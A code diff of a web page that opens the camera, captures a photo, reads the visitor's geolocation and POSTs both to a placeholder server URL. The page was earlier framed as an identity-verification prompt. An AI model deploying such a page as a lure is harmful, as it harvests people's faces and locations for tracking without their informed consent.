@@ -1,24 +1,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera Verification</title>
+  <title>Camera + Location Capture</title>
 </head>
 <body>
-  <h2>Please verify your identity</h2>
+  <h2>Camera + Geolocation Test</h2>
 
   <button onclick="startCamera()">Open Camera</button>
+  <button onclick="takePhoto()">Take Photo</button>
+
   <p id="status"></p>
 
   <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
 <script>
+let stream;
+
+// Start camera
 async function startCamera() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    stream = await navigator.mediaDevices.getUserMedia({ video: true });
     document.getElementById("video").srcObject = stream;
-    document.getElementById("status").innerText = "Camera access granted.";
+    document.getElementById("status").innerText = "Camera opened!";
   } catch (err) {
     document.getElementById("status").innerText = "Camera permission denied.";
+  }
+}
+
+// Take photo (user must click)
+function takePhoto() {
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const context = canvas.getContext("2d");
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  
+  const image = canvas.toDataURL("image/png");
+
+  document.getElementById("status").innerText = "Photo captured!";
+
+  // After photo, get location
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        // Upload photo + location
+        fetch("YOUR_SERVER_URL_HERE", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            image: image,
+            latitude: lat,
+            longitude: lon
+          })
+        })
+        .then(() => {
+          document.getElementById("status").innerText = "Photo + location sent!";
+        })
+        .catch(() => {
+          document.getElementById("status").innerText = "Failed to upload.";
+        });
+
+      },
+      () => {
+        document.getElementById("status").innerText = "Location denied.";
+      }
+    );
+  } else {
+    document.getElementById("status").innerText = "Geolocation not supported.";
   }
 }
 </script>
